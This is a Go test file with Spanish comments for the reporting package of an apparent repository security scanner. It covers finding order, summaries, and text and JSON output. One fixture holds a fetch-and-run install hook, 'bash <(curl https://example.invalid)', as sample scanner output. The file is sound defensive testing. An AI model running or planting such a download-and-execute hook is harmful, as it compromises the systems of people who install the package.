// Tests para el paquete report.
//
// Este paquete toma los hallazgos ya filtrados y los presenta, en texto o en
// JSON. La lógica de "qué se encontró" no vive aquí: solo la presentación.
//
// ---------------------------------------------------------------------------
// Contrato
// ---------------------------------------------------------------------------
//
//	type Summary struct {
//	    High   int `json:"high"`
//	    Medium int `json:"medium"`
//	    Low    int `json:"low"`
//	}
//
//	type Report struct {
//	    Findings   []analyzer.Finding `json:"findings"`
//	    Skipped    []string           `json:"skipped"`
//	    Suppressed int                `json:"suppressed"`
//	    Summary    Summary            `json:"summary"`
//	}
//
//	func New(findings []analyzer.Finding, skipped []string, suppressed int) Report
//	func (r Report) WriteText(w io.Writer) error
//	func (r Report) WriteJSON(w io.Writer) error
//
// El ordenamiento que tienes en main se muda a New: el reporte es quien
// garantiza el orden, sin importar quién lo use.
//
// ---------------------------------------------------------------------------
// Cambios que necesitas en el paquete analyzer
// ---------------------------------------------------------------------------
//
//  1. Struct tags en Finding, para que las claves del JSON sean en minúscula:
//
//     Rule     string   `json:"rule"`
//     File     string   `json:"file"`
//     Line     int      `json:"line,omitempty"`   // 0 = archivo completo: se omite
//     Severity Severity `json:"severity"`
//     Message  string   `json:"message"`
//
//  2. Que Severity salga como "high" y no como 3. encoding/json no usa
//     String(): busca otras interfaces. Investiga encoding.TextMarshaler.
//     Pista: es un método de una línea que reutiliza tu String().
//
// Cómo correrlos:
//
//	go test ./internal/report -v
package report

import (
	"bytes"
	"encoding/json"
	"slices"
	"strings"
	"testing"

	"github.com/divan1319/repo-scan/internal/analyzer"
)

// sample devuelve hallazgos DESORDENADOS a propósito.
func sample() []analyzer.Finding {
	return []analyzer.Finding{
		{Rule: "bidi-unicode", File: "src/a.sh", Line: 9, Severity: analyzer.High, Message: "bidi"},
		{Rule: "install-hooks", File: "package.json", Line: 0, Severity: analyzer.Medium, Message: "hook"},
		{Rule: "download-exec", File: "src/a.sh", Line: 2, Severity: analyzer.High, Message: "curl"},
		{Rule: "high-entropy", File: "lib/x.js", Line: 4, Severity: analyzer.Medium, Message: "entropía"},
	}
}

// ---------------------------------------------------------------------------
// New
// ---------------------------------------------------------------------------

func TestNewOrdena(t *testing.T) {
	r := New(sample(), nil, 0)

	// Orden esperado: por archivo (orden de strings) y luego por línea.
	want := []string{"lib/x.js:4", "package.json:0", "src/a.sh:2", "src/a.sh:9"}
	var got []string
	for _, f := range r.Findings {
		got = append(got, f.File+":"+itoa(f.Line))
	}
	if !slices.Equal(got, want) {
		t.Errorf("orden:\n got  %v\n want %v", got, want)
	}
}

// New no debe modificar el slice que recibe.
//
// slices.SortStableFunc ordena EN EL LUGAR: si ordenas directamente el slice
// que te pasaron, el que llamó a New ve su slice reordenado sin haberlo
// pedido. Es un efecto secundario sorpresa. Pista: slices.Clone.
func TestNewNoModificaLaEntrada(t *testing.T) {
	in := sample()
	before := slices.Clone(in)

	New(in, nil, 0)

	if !slices.Equal(in, before) {
		t.Error("New modificó el slice de entrada (¿lo ordenaste en el lugar?)")
	}
}

// Un slice nil se convierte en JSON como null, y uno vacío como [].
// Para quien consume el JSON (un script, jq, otro programa), "findings": null
// obliga a tratar un caso especial. Siempre queremos [].
//
// Es una de las sutilezas clásicas de Go: `var s []T` (nil) y `[]T{}` (vacío)
// se comportan igual con len, range y append, pero NO al serializar.
func TestNewSinHallazgosUsaSlicesVacios(t *testing.T) {
	r := New(nil, nil, 0)

	if r.Findings == nil {
		t.Error("Findings es nil; debe ser un slice vacío")
	}
	if r.Skipped == nil {
		t.Error("Skipped es nil; debe ser un slice vacío")
	}
}

func TestNewResumen(t *testing.T) {
	r := New(sample(), []string{"big.bin"}, 7)

	want := Summary{High: 2, Medium: 2, Low: 0}
	if r.Summary != want { // los structs con campos comparables se comparan con ==
		t.Errorf("Summary = %+v, want %+v", r.Summary, want)
	}
	if r.Suppressed != 7 {
		t.Errorf("Suppressed = %d, want 7", r.Suppressed)
	}
	if !slices.Equal(r.Skipped, []string{"big.bin"}) {
		t.Errorf("Skipped = %v", r.Skipped)
	}
}

// ---------------------------------------------------------------------------
// WriteText: el mismo formato que ya tenías en main
// ---------------------------------------------------------------------------

func TestWriteText(t *testing.T) {
	var buf bytes.Buffer
	if err := New(sample(), nil, 0).WriteText(&buf); err != nil {
		t.Fatal(err)
	}

	want := "lib/x.js:4: [medium] high-entropy: entropía\n" +
		"package.json: [medium] install-hooks: hook\n" +
		"src/a.sh:2: [high] download-exec: curl\n" +
		"src/a.sh:9: [high] bidi-unicode: bidi\n"

	if buf.String() != want {
		t.Errorf("WriteText:\n--- got ---\n%s--- want ---\n%s", buf.String(), want)
	}
}

// ---------------------------------------------------------------------------
// WriteJSON
// ---------------------------------------------------------------------------

// Severity debe serializarse como string. Este test va directo al grano:
// json.Marshal de una Severity sola.
func TestSeverityJSON(t *testing.T) {
	tests := []struct {
		sev  analyzer.Severity
		want string
	}{
		{analyzer.High, `"high"`},
		{analyzer.Medium, `"medium"`},
		{analyzer.Low, `"low"`},
		{analyzer.Severity(0), `"unknown"`},
	}
	for _, tt := range tests {
		b, err := json.Marshal(tt.sev)
		if err != nil {
			t.Fatalf("json.Marshal(%v): %v", tt.sev, err)
		}
		if string(b) != tt.want {
			t.Errorf("json.Marshal(Severity(%d)) = %s, want %s", int(tt.sev), b, tt.want)
		}
	}
}

func TestWriteJSONEstructura(t *testing.T) {
	var buf bytes.Buffer
	if err := New(sample(), []string{"big.bin"}, 3).WriteJSON(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()

	// Decodificamos en tipos genéricos (map[string]any) para revisar las
	// claves EXACTAS que salen, sin depender de tus structs.
	var doc map[string]any
	if err := json.Unmarshal(buf.Bytes(), &doc); err != nil {
		t.Fatalf("la salida no es JSON válido: %v\n%s", err, out)
	}

	for _, key := range []string{"findings", "skipped", "suppressed", "summary"} {
		if _, ok := doc[key]; !ok {
			t.Errorf("falta la clave %q en el JSON", key)
		}
	}

	// json.Unmarshal en any convierte arrays JSON en []any y objetos en
	// map[string]any. Por eso las type assertions.
	findings, ok := doc["findings"].([]any)
	if !ok || len(findings) != 4 {
		t.Fatalf("findings debe ser un array de 4 elementos, got %v", doc["findings"])
	}

	// Primer hallazgo (ya ordenado): lib/x.js:4.
	first := findings[0].(map[string]any)
	wantKeys := []string{"file", "line", "message", "rule", "severity"}
	if got := sortedKeys(first); !slices.Equal(got, wantKeys) {
		t.Errorf("claves de un hallazgo = %v, want %v (¿faltan struct tags?)", got, wantKeys)
	}
	if first["severity"] != "medium" {
		t.Errorf(`severity = %v, want "medium" (¿falta MarshalText?)`, first["severity"])
	}
	// Los números JSON se decodifican como float64 al usar any.
	if first["line"] != float64(4) {
		t.Errorf("line = %v, want 4", first["line"])
	}

	// Segundo hallazgo: package.json con Line 0 -> "line" debe omitirse.
	second := findings[1].(map[string]any)
	if _, has := second["line"]; has {
		t.Errorf(`un hallazgo con Line 0 no debe tener "line" (¿falta omitempty?): %v`, second)
	}

	if doc["suppressed"] != float64(3) {
		t.Errorf("suppressed = %v, want 3", doc["suppressed"])
	}
	summary := doc["summary"].(map[string]any)
	if summary["high"] != float64(2) || summary["medium"] != float64(2) || summary["low"] != float64(0) {
		t.Errorf("summary = %v, want high=2 medium=2 low=0", summary)
	}

	// Indentado con 2 espacios: legible para humanos y fácil de comparar
	// en un diff. Pista: json.Encoder tiene SetIndent.
	if !strings.Contains(out, "\n  \"findings\": [") {
		t.Errorf("se esperaba JSON indentado con 2 espacios:\n%s", out)
	}
}

// Sin hallazgos, el JSON debe decir "findings": [] y no null.
func TestWriteJSONVacio(t *testing.T) {
	var buf bytes.Buffer
	if err := New(nil, nil, 0).WriteJSON(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, `"findings": []`) {
		t.Errorf(`se esperaba "findings": [] en:\n%s`, out)
	}
	if !strings.Contains(out, `"skipped": []`) {
		t.Errorf(`se esperaba "skipped": [] en:\n%s`, out)
	}
}

// Por defecto, encoding/json escapa <, > y & como <, > y &
// (lo hace para que el JSON sea seguro de incrustar en HTML). En un reporte
// de seguridad eso es un problema: el comando `bash <(curl ...)` se ve como
// `bash <(curl ...)`, y al buscar "<(" con grep no lo encuentras.
//
// El JSON sigue siendo válido en ambos casos; esto es sobre legibilidad.
// Pista: json.Encoder tiene un método para desactivar ese escape. Con
// json.Marshal no se puede, así que usa un Encoder.
func TestWriteJSONNoEscapaHTML(t *testing.T) {
	fs := []analyzer.Finding{{
		Rule: "install-hooks", File: "package.json", Severity: analyzer.High,
		Message: `script postinstall: bash <(curl https://example.invalid) && echo ok`,
	}}
	var buf bytes.Buffer
	if err := New(fs, nil, 0).WriteJSON(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "bash <(curl") || !strings.Contains(out, "&& echo") {
		t.Errorf("el mensaje salió escapado; se esperaba texto literal:\n%s", out)
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// itoa evita importar strconv solo para esto.
func itoa(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

// sortedKeys devuelve las claves de un map en orden. Go recorre los maps en
// orden aleatorio, así que para comparar hay que ordenar.
func sortedKeys(m map[string]any) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	slices.Sort(keys)
	return keys
}
